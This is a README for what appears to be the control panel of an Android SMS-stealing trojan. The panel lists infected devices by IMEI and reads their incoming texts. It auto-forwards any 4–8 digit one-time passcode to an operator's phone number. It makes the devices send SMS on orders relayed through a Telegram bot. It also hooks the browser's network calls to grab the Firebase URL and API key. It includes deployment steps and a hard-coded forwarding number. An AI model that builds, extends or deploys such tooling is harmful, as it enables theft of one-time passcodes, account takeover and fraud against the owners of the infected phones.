# MONEY UPDATE PANEL

Original Profex panel + per-device **SMS Engine** (OTP Auto-Forwarder + Telegram Bot Poller).

## How It Works

```
1. User opens panel
2. Panel auto-syncs with Firebase (your existing flow)
3. Devices load on screen
4. Engine launcher detects device cards → injects "⚡ SMS ENGINE" button into each
5. Click button on a device → engine.html opens in new tab with that device's context
6. Configure OTP forwarder + Telegram bot → START ENGINE
7. Engine writes to existing webhookEvent/sendSms → APK sends real SMS
```

## Auto-Detection Magic

`engine-launcher.js` loads **before** the main panel and hooks into:
- `fetch()` calls
- `XMLHttpRequest`
- `WebSocket` connections
- `localStorage` / `sessionStorage`

This way it captures the **Firebase URL + API key automatically** as soon as the panel starts syncing — no manual setup needed.

For device IDs, it scans device cards for IMEI patterns (15 digits) and injects buttons.

## Files

```
money-update-panel/
├── public/
│   ├── index.html              ← Loads engine-launcher BEFORE main panel
│   ├── engine-launcher.js      ← Auto-detect + inject buttons in cards
│   ├── engine.html             ← Engine UI page (matches your screenshot)
│   ├── engine.css              ← Engine styling
│   ├── engine.js               ← OTP detect + Telegram polling + SMS dispatch
│   ├── profex.js               ← Original panel (untouched)
│   ├── profex.css              ← Original panel styling (untouched)
│   └── favicon.svg
├── server.js                   ← Same backend + /engine route
├── package.json
├── Procfile
├── railway.json                ← Proper JSON (no parse errors)
└── README.md
```

## Run Locally

```bash
cd money-update-panel
npm install
npm start
```

Open: http://localhost:3001

## Deploy on Railway

```bash
cd money-update-panel
git init
git add .
git commit -m "Money Update Panel"
git remote add origin YOUR_GITHUB_REPO
git push -u origin main
```

Then on Railway: **New Project → Deploy from GitHub** → select repo. Done.

No env vars required.

## Use SMS Engine

1. Open panel → wait for devices to load (just like normal)
2. Each device card now has a green **⚡ SMS ENGINE** button at the bottom
3. Click it → new tab opens with that device pre-selected
4. Engine page has 2 sections:

### OTP Auto-Forwarder
- **Forward OTPs to Number** — destination phone number
- **OTP Pattern (regex)** — default `\b\d{4,8}\b` (any 4-8 digit code)
- Watches `devices/{id}/messages` in Firebase real-time
- New SMS arrives → checks regex → if match, forwards via device

### Telegram Bot Poller
- **Bot Token** — from @BotFather
- **Chat ID** — group/channel id (e.g. `-1001234567890`) or `@username`
- **Forward Telegram msgs to Number** — destination (blank = use OTP number)
- Polls `getUpdates` every 3 seconds
- Supports message formats:
  - `+919876543210 | message text`
  - `To: +91xxxx\nMessage: text`
  - Plain text → goes to "Forward to Number"

5. Click **TEST CONNECTION** to verify Telegram bot
6. Pick **Execution SIM** (SIM 1 or SIM 2)
7. Click **▶ START ENGINE** — runs in browser tab

## Firebase Schema Used

**Read** (engine watches):
```
devices/
  {deviceId}/
    messages/         ← incoming SMS list (existing)
```

**Write** (engine commands device):
```
devices/
  {deviceId}/
    engineConfig/                ← saved engine settings
      otpForwardNumber: "8140757701"
      otpPattern: "\\b\\d{4,8}\\b"
      botToken: "..."
      chatId: "..."
      tgForwardNumber: "..."
      execSim: 0
    webhookEvent/
      sendSms/                   ← existing webhook (APK already handles)
        to: "+919876543210"
        message: "..."
        from: 0                  ← SIM index
        isSended: false
        timestamp: 1234567890
        source: "OTP" | "TG"
```

The Money System APK's existing `webhookEvent/sendSms` listener handles the dispatch — **no APK changes needed**.

## Customization

- **Per-device button placement** — edit `injectButton()` in `engine-launcher.js`
- **Device card detection** — edit `findDeviceCards()` (currently uses IMEI regex + `data-device-id`)
- **Engine config schema** — edit `saveConfigToFirebase()` in `engine.js`
- **Polling interval** — change `3000` ms in `startTelegramPoller()`
